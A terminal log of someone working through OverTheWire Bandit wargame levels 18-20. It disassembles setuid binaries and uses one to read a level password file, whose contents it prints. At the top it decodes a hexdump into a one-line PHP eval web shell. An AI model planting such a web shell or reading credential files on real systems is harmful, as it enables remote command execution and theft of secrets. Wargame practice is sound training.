➜  TMP hexdump 2 > 2.test
➜  TMP cat 2.test
0000000 3c 3f 70 68 70 0a 0a 40 65 76 61 6c 28 24 5f 47
0000010 45 54 5b 27 73 68 65 6c 6c 27 5d 29 3b
000001d
➜  TMP xxd -r 2.test
<?php

@eval($_GET['shell']);%                                                         ➜  TMP rm 2.test
➜  ~ ssh bandit18@bandit.labs.overthewire.org -p2220
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
bandit18@bandit.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

Byebye !
Connection to bandit.labs.overthewire.org closed.
➜  ~ ssh bandit19@bandit.labs.overthewire.org -p2220
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
bandit19@bandit.labs.overthewire.org's password:
Permission denied, please try again.
bandit19@bandit.labs.overthewire.org's password:

➜  ~ ssh bandit19@bandit.labs.overthewire.org -p2220
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
bandit19@bandit.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

bandit19@bandit:~$ ls -la
total 28
drwxr-xr-x  2 root     root     4096 Dec 28 14:34 .
drwxr-xr-x 29 root     root     4096 Dec 28 14:34 ..
-rw-r--r--  1 root     root      220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root     root     3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root     root      655 Jun 24  2016 .profile
-rwsr-x---  1 bandit20 bandit19 7408 Dec 28 14:34 bandit20-do

bandit19@bandit:~$ ./bandit20-do id
uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
bandit19@bandit:~$ ./bandit20-do
Run a command as another user.
  Example: ./bandit20-do id
bandit19@bandit:~$ objdump -d bandit20-do -Mintel

bandit20-do:     file format elf32-i386


Disassembly of section .init:

080482ec <_init>:
 80482ec:	53                   	push   ebx
 80482ed:	83 ec 08             	sub    esp,0x8
 80482f0:	e8 ab 00 00 00       	call   80483a0 <__x86.get_pc_thunk.bx>
 80482f5:	81 c3 0b 1d 00 00    	add    ebx,0x1d0b
 80482fb:	8b 83 fc ff ff ff    	mov    eax,DWORD PTR [ebx-0x4]
 8048301:	85 c0                	test   eax,eax
 8048303:	74 05                	je     804830a <_init+0x1e>
 8048305:	e8 56 00 00 00       	call   8048360 <execv@plt+0x10>
 804830a:	83 c4 08             	add    esp,0x8
 804830d:	5b                   	pop    ebx
 804830e:	c3                   	ret

Disassembly of section .plt:

08048310 <printf@plt-0x10>:
 8048310:	ff 35 04 a0 04 08    	push   DWORD PTR ds:0x804a004
 8048316:	ff 25 08 a0 04 08    	jmp    DWORD PTR ds:0x804a008
 804831c:	00 00                	add    BYTE PTR [eax],al
	...

08048320 <printf@plt>:
 8048320:	ff 25 0c a0 04 08    	jmp    DWORD PTR ds:0x804a00c
 8048326:	68 00 00 00 00       	push   0x0
 804832b:	e9 e0 ff ff ff       	jmp    8048310 <_init+0x24>

08048330 <exit@plt>:
 8048330:	ff 25 10 a0 04 08    	jmp    DWORD PTR ds:0x804a010
 8048336:	68 08 00 00 00       	push   0x8
 804833b:	e9 d0 ff ff ff       	jmp    8048310 <_init+0x24>

08048340 <__libc_start_main@plt>:
 8048340:	ff 25 14 a0 04 08    	jmp    DWORD PTR ds:0x804a014
 8048346:	68 10 00 00 00       	push   0x10
 804834b:	e9 c0 ff ff ff       	jmp    8048310 <_init+0x24>

08048350 <execv@plt>:
 8048350:	ff 25 18 a0 04 08    	jmp    DWORD PTR ds:0x804a018
 8048356:	68 18 00 00 00       	push   0x18
 804835b:	e9 b0 ff ff ff       	jmp    8048310 <_init+0x24>

Disassembly of section .plt.got:

08048360 <.plt.got>:
 8048360:	ff 25 fc 9f 04 08    	jmp    DWORD PTR ds:0x8049ffc
 8048366:	66 90                	xchg   ax,ax

Disassembly of section .text:

08048370 <_start>:
 8048370:	31 ed                	xor    ebp,ebp
 8048372:	5e                   	pop    esi
 8048373:	89 e1                	mov    ecx,esp
 8048375:	83 e4 f0             	and    esp,0xfffffff0
 8048378:	50                   	push   eax
 8048379:	54                   	push   esp
 804837a:	52                   	push   edx
 804837b:	68 20 85 04 08       	push   0x8048520
 8048380:	68 c0 84 04 08       	push   0x80484c0
 8048385:	51                   	push   ecx
 8048386:	56                   	push   esi
 8048387:	68 6d 84 04 08       	push   0x804846d
 804838c:	e8 af ff ff ff       	call   8048340 <__libc_start_main@plt>
 8048391:	f4                   	hlt
 8048392:	66 90                	xchg   ax,ax
 8048394:	66 90                	xchg   ax,ax
 8048396:	66 90                	xchg   ax,ax
 8048398:	66 90                	xchg   ax,ax
 804839a:	66 90                	xchg   ax,ax
 804839c:	66 90                	xchg   ax,ax
 804839e:	66 90                	xchg   ax,ax

080483a0 <__x86.get_pc_thunk.bx>:
 80483a0:	8b 1c 24             	mov    ebx,DWORD PTR [esp]
 80483a3:	c3                   	ret
 80483a4:	66 90                	xchg   ax,ax
 80483a6:	66 90                	xchg   ax,ax
 80483a8:	66 90                	xchg   ax,ax
 80483aa:	66 90                	xchg   ax,ax
 80483ac:	66 90                	xchg   ax,ax
 80483ae:	66 90                	xchg   ax,ax

080483b0 <deregister_tm_clones>:
 80483b0:	b8 27 a0 04 08       	mov    eax,0x804a027
 80483b5:	2d 24 a0 04 08       	sub    eax,0x804a024
 80483ba:	83 f8 06             	cmp    eax,0x6
 80483bd:	77 01                	ja     80483c0 <deregister_tm_clones+0x10>
 80483bf:	c3                   	ret
 80483c0:	b8 00 00 00 00       	mov    eax,0x0
 80483c5:	85 c0                	test   eax,eax
 80483c7:	74 f6                	je     80483bf <deregister_tm_clones+0xf>
 80483c9:	55                   	push   ebp
 80483ca:	89 e5                	mov    ebp,esp
 80483cc:	83 ec 18             	sub    esp,0x18
 80483cf:	c7 04 24 24 a0 04 08 	mov    DWORD PTR [esp],0x804a024
 80483d6:	ff d0                	call   eax
 80483d8:	c9                   	leave
 80483d9:	c3                   	ret
 80483da:	8d b6 00 00 00 00    	lea    esi,[esi+0x0]

080483e0 <register_tm_clones>:
 80483e0:	b8 24 a0 04 08       	mov    eax,0x804a024
 80483e5:	2d 24 a0 04 08       	sub    eax,0x804a024
 80483ea:	c1 f8 02             	sar    eax,0x2
 80483ed:	89 c2                	mov    edx,eax
 80483ef:	c1 ea 1f             	shr    edx,0x1f
 80483f2:	01 d0                	add    eax,edx
 80483f4:	d1 f8                	sar    eax,1
 80483f6:	75 01                	jne    80483f9 <register_tm_clones+0x19>
 80483f8:	c3                   	ret
 80483f9:	ba 00 00 00 00       	mov    edx,0x0
 80483fe:	85 d2                	test   edx,edx
 8048400:	74 f6                	je     80483f8 <register_tm_clones+0x18>
 8048402:	55                   	push   ebp
 8048403:	89 e5                	mov    ebp,esp
 8048405:	83 ec 18             	sub    esp,0x18
 8048408:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 804840c:	c7 04 24 24 a0 04 08 	mov    DWORD PTR [esp],0x804a024
 8048413:	ff d2                	call   edx
 8048415:	c9                   	leave
 8048416:	c3                   	ret
 8048417:	89 f6                	mov    esi,esi
 8048419:	8d bc 27 00 00 00 00 	lea    edi,[edi+eiz*1+0x0]

08048420 <__do_global_dtors_aux>:
 8048420:	80 3d 24 a0 04 08 00 	cmp    BYTE PTR ds:0x804a024,0x0
 8048427:	75 13                	jne    804843c <__do_global_dtors_aux+0x1c>
 8048429:	55                   	push   ebp
 804842a:	89 e5                	mov    ebp,esp
 804842c:	83 ec 08             	sub    esp,0x8
 804842f:	e8 7c ff ff ff       	call   80483b0 <deregister_tm_clones>
 8048434:	c6 05 24 a0 04 08 01 	mov    BYTE PTR ds:0x804a024,0x1
 804843b:	c9                   	leave
 804843c:	f3 c3                	repz ret
 804843e:	66 90                	xchg   ax,ax

08048440 <frame_dummy>:
 8048440:	a1 10 9f 04 08       	mov    eax,ds:0x8049f10
 8048445:	85 c0                	test   eax,eax
 8048447:	74 1f                	je     8048468 <frame_dummy+0x28>
 8048449:	b8 00 00 00 00       	mov    eax,0x0
 804844e:	85 c0                	test   eax,eax
 8048450:	74 16                	je     8048468 <frame_dummy+0x28>
 8048452:	55                   	push   ebp
 8048453:	89 e5                	mov    ebp,esp
 8048455:	83 ec 18             	sub    esp,0x18
 8048458:	c7 04 24 10 9f 04 08 	mov    DWORD PTR [esp],0x8049f10
 804845f:	ff d0                	call   eax
 8048461:	c9                   	leave
 8048462:	e9 79 ff ff ff       	jmp    80483e0 <register_tm_clones>
 8048467:	90                   	nop
 8048468:	e9 73 ff ff ff       	jmp    80483e0 <register_tm_clones>

0804846d <main>:
 804846d:	55                   	push   ebp
 804846e:	89 e5                	mov    ebp,esp
 8048470:	83 e4 f0             	and    esp,0xfffffff0
 8048473:	83 ec 10             	sub    esp,0x10
 8048476:	83 7d 08 01          	cmp    DWORD PTR [ebp+0x8],0x1
 804847a:	7f 21                	jg     804849d <main+0x30>
 804847c:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 804847f:	8b 00                	mov    eax,DWORD PTR [eax]
 8048481:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048485:	c7 04 24 40 85 04 08 	mov    DWORD PTR [esp],0x8048540
 804848c:	e8 8f fe ff ff       	call   8048320 <printf@plt>
 8048491:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 8048498:	e8 93 fe ff ff       	call   8048330 <exit@plt>
 804849d:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 80484a0:	c7 00 71 85 04 08    	mov    DWORD PTR [eax],0x8048571
 80484a6:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 80484a9:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 80484ad:	c7 04 24 75 85 04 08 	mov    DWORD PTR [esp],0x8048575
 80484b4:	e8 97 fe ff ff       	call   8048350 <execv@plt>
 80484b9:	b8 00 00 00 00       	mov    eax,0x0
 80484be:	c9                   	leave
 80484bf:	c3                   	ret

080484c0 <__libc_csu_init>:
 80484c0:	55                   	push   ebp
 80484c1:	57                   	push   edi
 80484c2:	56                   	push   esi
 80484c3:	53                   	push   ebx
 80484c4:	e8 d7 fe ff ff       	call   80483a0 <__x86.get_pc_thunk.bx>
 80484c9:	81 c3 37 1b 00 00    	add    ebx,0x1b37
 80484cf:	83 ec 0c             	sub    esp,0xc
 80484d2:	8b 6c 24 20          	mov    ebp,DWORD PTR [esp+0x20]
 80484d6:	8d b3 0c ff ff ff    	lea    esi,[ebx-0xf4]
 80484dc:	e8 0b fe ff ff       	call   80482ec <_init>
 80484e1:	8d 83 08 ff ff ff    	lea    eax,[ebx-0xf8]
 80484e7:	29 c6                	sub    esi,eax
 80484e9:	c1 fe 02             	sar    esi,0x2
 80484ec:	85 f6                	test   esi,esi
 80484ee:	74 25                	je     8048515 <__libc_csu_init+0x55>
 80484f0:	31 ff                	xor    edi,edi
 80484f2:	8d b6 00 00 00 00    	lea    esi,[esi+0x0]
 80484f8:	83 ec 04             	sub    esp,0x4
 80484fb:	ff 74 24 2c          	push   DWORD PTR [esp+0x2c]
 80484ff:	ff 74 24 2c          	push   DWORD PTR [esp+0x2c]
 8048503:	55                   	push   ebp
 8048504:	ff 94 bb 08 ff ff ff 	call   DWORD PTR [ebx+edi*4-0xf8]
 804850b:	83 c7 01             	add    edi,0x1
 804850e:	83 c4 10             	add    esp,0x10
 8048511:	39 f7                	cmp    edi,esi
 8048513:	75 e3                	jne    80484f8 <__libc_csu_init+0x38>
 8048515:	83 c4 0c             	add    esp,0xc
 8048518:	5b                   	pop    ebx
 8048519:	5e                   	pop    esi
 804851a:	5f                   	pop    edi
 804851b:	5d                   	pop    ebp
 804851c:	c3                   	ret
 804851d:	8d 76 00             	lea    esi,[esi+0x0]

08048520 <__libc_csu_fini>:
 8048520:	f3 c3                	repz ret

Disassembly of section .fini:

08048524 <_fini>:
 8048524:	53                   	push   ebx
 8048525:	83 ec 08             	sub    esp,0x8
 8048528:	e8 73 fe ff ff       	call   80483a0 <__x86.get_pc_thunk.bx>
 804852d:	81 c3 d3 1a 00 00    	add    ebx,0x1ad3
 8048533:	83 c4 08             	add    esp,0x8
 8048536:	5b                   	pop    ebx
 8048537:	c3                   	ret
bandit19@bandit:~$ xxd -s 0x571 -l 0x40 bandit20-do
00000571: 656e 7600 2f75 7372 2f62 696e 2f65 6e76  env./usr/bin/env
00000581: 0000 0001 1b03 3b28 0000 0004 0000 008c  ......;(........
00000591: fdff ff44 0000 00e9 feff ff68 0000 003c  ...D.......h...<
000005a1: ffff ff88 0000 009c ffff ffd4 0000 0014  ................
bandit19@bandit:~$ ./bandit20-do  "cat /etc/bandit_pass/bandit20"
env: 'cat /etc/bandit_pass/bandit20': No such file or directory
bandit19@bandit:~$ cat /etc/bandit_pass/bandit20
cat: /etc/bandit_pass/bandit20: Permission denied
bandit19@bandit:~$ ./bandit20-do id
uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
bandit19@bandit:~$ id
uid=11019(bandit19) gid=11019(bandit19) groups=11019(bandit19)
bandit19@bandit:~$ ./bandit20-do  cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
bandit19@bandit:~$ ssh bandit20@localhost
Could not create directory '/home/bandit19/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit19/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
bandit20@localhost's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

bandit20@bandit:~$ ll
total 28
drwxr-xr-x  2 root     root     4096 Dec 28 14:34 ./
drwxr-xr-x 29 root     root     4096 Dec 28 14:34 ../
-rw-r--r--  1 root     root      220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root     root     3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root     root      655 Jun 24  2016 .profile
-rwsr-x---  1 bandit21 bandit20 8044 Dec 28 14:34 suconnect*
bandit20@bandit:~$ objdump -d -Mintel suconnect

suconnect:     file format elf32-i386


Disassembly of section .init:

08048528 <_init>:
 8048528:	53                   	push   ebx
 8048529:	83 ec 08             	sub    esp,0x8
 804852c:	e8 af 01 00 00       	call   80486e0 <__x86.get_pc_thunk.bx>
 8048531:	81 c3 cf 1a 00 00    	add    ebx,0x1acf
 8048537:	8b 83 fc ff ff ff    	mov    eax,DWORD PTR [ebx-0x4]
 804853d:	85 c0                	test   eax,eax
 804853f:	74 05                	je     8048546 <_init+0x1e>
 8048541:	e8 5a 01 00 00       	call   80486a0 <send@plt+0x10>
 8048546:	83 c4 08             	add    esp,0x8
 8048549:	5b                   	pop    ebx
 804854a:	c3                   	ret

Disassembly of section .plt:

08048550 <strcmp@plt-0x10>:
 8048550:	ff 35 04 a0 04 08    	push   DWORD PTR ds:0x804a004
 8048556:	ff 25 08 a0 04 08    	jmp    DWORD PTR ds:0x804a008
 804855c:	00 00                	add    BYTE PTR [eax],al
	...

08048560 <strcmp@plt>:
 8048560:	ff 25 0c a0 04 08    	jmp    DWORD PTR ds:0x804a00c
 8048566:	68 00 00 00 00       	push   0x0
 804856b:	e9 e0 ff ff ff       	jmp    8048550 <_init+0x28>

08048570 <printf@plt>:
 8048570:	ff 25 10 a0 04 08    	jmp    DWORD PTR ds:0x804a010
 8048576:	68 08 00 00 00       	push   0x8
 804857b:	e9 d0 ff ff ff       	jmp    8048550 <_init+0x28>

08048580 <bzero@plt>:
 8048580:	ff 25 14 a0 04 08    	jmp    DWORD PTR ds:0x804a014
 8048586:	68 10 00 00 00       	push   0x10
 804858b:	e9 c0 ff ff ff       	jmp    8048550 <_init+0x28>

08048590 <fgets@plt>:
 8048590:	ff 25 18 a0 04 08    	jmp    DWORD PTR ds:0x804a018
 8048596:	68 18 00 00 00       	push   0x18
 804859b:	e9 b0 ff ff ff       	jmp    8048550 <_init+0x28>

080485a0 <fclose@plt>:
 80485a0:	ff 25 1c a0 04 08    	jmp    DWORD PTR ds:0x804a01c
 80485a6:	68 20 00 00 00       	push   0x20
 80485ab:	e9 a0 ff ff ff       	jmp    8048550 <_init+0x28>

080485b0 <__stack_chk_fail@plt>:
 80485b0:	ff 25 20 a0 04 08    	jmp    DWORD PTR ds:0x804a020
 80485b6:	68 28 00 00 00       	push   0x28
 80485bb:	e9 90 ff ff ff       	jmp    8048550 <_init+0x28>

080485c0 <htons@plt>:
 80485c0:	ff 25 24 a0 04 08    	jmp    DWORD PTR ds:0x804a024
 80485c6:	68 30 00 00 00       	push   0x30
 80485cb:	e9 80 ff ff ff       	jmp    8048550 <_init+0x28>

080485d0 <puts@plt>:
 80485d0:	ff 25 28 a0 04 08    	jmp    DWORD PTR ds:0x804a028
 80485d6:	68 38 00 00 00       	push   0x38
 80485db:	e9 70 ff ff ff       	jmp    8048550 <_init+0x28>

080485e0 <exit@plt>:
 80485e0:	ff 25 2c a0 04 08    	jmp    DWORD PTR ds:0x804a02c
 80485e6:	68 40 00 00 00       	push   0x40
 80485eb:	e9 60 ff ff ff       	jmp    8048550 <_init+0x28>

080485f0 <strchr@plt>:
 80485f0:	ff 25 30 a0 04 08    	jmp    DWORD PTR ds:0x804a030
 80485f6:	68 48 00 00 00       	push   0x48
 80485fb:	e9 50 ff ff ff       	jmp    8048550 <_init+0x28>

08048600 <strlen@plt>:
 8048600:	ff 25 34 a0 04 08    	jmp    DWORD PTR ds:0x804a034
 8048606:	68 50 00 00 00       	push   0x50
 804860b:	e9 40 ff ff ff       	jmp    8048550 <_init+0x28>

08048610 <__libc_start_main@plt>:
 8048610:	ff 25 38 a0 04 08    	jmp    DWORD PTR ds:0x804a038
 8048616:	68 58 00 00 00       	push   0x58
 804861b:	e9 30 ff ff ff       	jmp    8048550 <_init+0x28>

08048620 <fopen@plt>:
 8048620:	ff 25 3c a0 04 08    	jmp    DWORD PTR ds:0x804a03c
 8048626:	68 60 00 00 00       	push   0x60
 804862b:	e9 20 ff ff ff       	jmp    8048550 <_init+0x28>

08048630 <memset@plt>:
 8048630:	ff 25 40 a0 04 08    	jmp    DWORD PTR ds:0x804a040
 8048636:	68 68 00 00 00       	push   0x68
 804863b:	e9 10 ff ff ff       	jmp    8048550 <_init+0x28>

08048640 <atoi@plt>:
 8048640:	ff 25 44 a0 04 08    	jmp    DWORD PTR ds:0x804a044
 8048646:	68 70 00 00 00       	push   0x70
 804864b:	e9 00 ff ff ff       	jmp    8048550 <_init+0x28>

08048650 <socket@plt>:
 8048650:	ff 25 48 a0 04 08    	jmp    DWORD PTR ds:0x804a048
 8048656:	68 78 00 00 00       	push   0x78
 804865b:	e9 f0 fe ff ff       	jmp    8048550 <_init+0x28>

08048660 <connect@plt>:
 8048660:	ff 25 4c a0 04 08    	jmp    DWORD PTR ds:0x804a04c
 8048666:	68 80 00 00 00       	push   0x80
 804866b:	e9 e0 fe ff ff       	jmp    8048550 <_init+0x28>

08048670 <recv@plt>:
 8048670:	ff 25 50 a0 04 08    	jmp    DWORD PTR ds:0x804a050
 8048676:	68 88 00 00 00       	push   0x88
 804867b:	e9 d0 fe ff ff       	jmp    8048550 <_init+0x28>

08048680 <close@plt>:
 8048680:	ff 25 54 a0 04 08    	jmp    DWORD PTR ds:0x804a054
 8048686:	68 90 00 00 00       	push   0x90
 804868b:	e9 c0 fe ff ff       	jmp    8048550 <_init+0x28>

08048690 <send@plt>:
 8048690:	ff 25 58 a0 04 08    	jmp    DWORD PTR ds:0x804a058
 8048696:	68 98 00 00 00       	push   0x98
 804869b:	e9 b0 fe ff ff       	jmp    8048550 <_init+0x28>

Disassembly of section .plt.got:

080486a0 <.plt.got>:
 80486a0:	ff 25 fc 9f 04 08    	jmp    DWORD PTR ds:0x8049ffc
 80486a6:	66 90                	xchg   ax,ax

Disassembly of section .text:

080486b0 <_start>:
 80486b0:	31 ed                	xor    ebp,ebp
 80486b2:	5e                   	pop    esi
 80486b3:	89 e1                	mov    ecx,esp
 80486b5:	83 e4 f0             	and    esp,0xfffffff0
 80486b8:	50                   	push   eax
 80486b9:	54                   	push   esp
 80486ba:	52                   	push   edx
 80486bb:	68 70 8b 04 08       	push   0x8048b70
 80486c0:	68 10 8b 04 08       	push   0x8048b10
 80486c5:	51                   	push   ecx
 80486c6:	56                   	push   esi
 80486c7:	68 3b 88 04 08       	push   0x804883b
 80486cc:	e8 3f ff ff ff       	call   8048610 <__libc_start_main@plt>
 80486d1:	f4                   	hlt
 80486d2:	66 90                	xchg   ax,ax
 80486d4:	66 90                	xchg   ax,ax
 80486d6:	66 90                	xchg   ax,ax
 80486d8:	66 90                	xchg   ax,ax
 80486da:	66 90                	xchg   ax,ax
 80486dc:	66 90                	xchg   ax,ax
 80486de:	66 90                	xchg   ax,ax

080486e0 <__x86.get_pc_thunk.bx>:
 80486e0:	8b 1c 24             	mov    ebx,DWORD PTR [esp]
 80486e3:	c3                   	ret
 80486e4:	66 90                	xchg   ax,ax
 80486e6:	66 90                	xchg   ax,ax
 80486e8:	66 90                	xchg   ax,ax
 80486ea:	66 90                	xchg   ax,ax
 80486ec:	66 90                	xchg   ax,ax
 80486ee:	66 90                	xchg   ax,ax

080486f0 <deregister_tm_clones>:
 80486f0:	b8 67 a0 04 08       	mov    eax,0x804a067
 80486f5:	2d 64 a0 04 08       	sub    eax,0x804a064
 80486fa:	83 f8 06             	cmp    eax,0x6
 80486fd:	77 01                	ja     8048700 <deregister_tm_clones+0x10>
 80486ff:	c3                   	ret
 8048700:	b8 00 00 00 00       	mov    eax,0x0
 8048705:	85 c0                	test   eax,eax
 8048707:	74 f6                	je     80486ff <deregister_tm_clones+0xf>
 8048709:	55                   	push   ebp
 804870a:	89 e5                	mov    ebp,esp
 804870c:	83 ec 18             	sub    esp,0x18
 804870f:	c7 04 24 64 a0 04 08 	mov    DWORD PTR [esp],0x804a064
 8048716:	ff d0                	call   eax
 8048718:	c9                   	leave
 8048719:	c3                   	ret
 804871a:	8d b6 00 00 00 00    	lea    esi,[esi+0x0]

08048720 <register_tm_clones>:
 8048720:	b8 64 a0 04 08       	mov    eax,0x804a064
 8048725:	2d 64 a0 04 08       	sub    eax,0x804a064
 804872a:	c1 f8 02             	sar    eax,0x2
 804872d:	89 c2                	mov    edx,eax
 804872f:	c1 ea 1f             	shr    edx,0x1f
 8048732:	01 d0                	add    eax,edx
 8048734:	d1 f8                	sar    eax,1
 8048736:	75 01                	jne    8048739 <register_tm_clones+0x19>
 8048738:	c3                   	ret
 8048739:	ba 00 00 00 00       	mov    edx,0x0
 804873e:	85 d2                	test   edx,edx
 8048740:	74 f6                	je     8048738 <register_tm_clones+0x18>
 8048742:	55                   	push   ebp
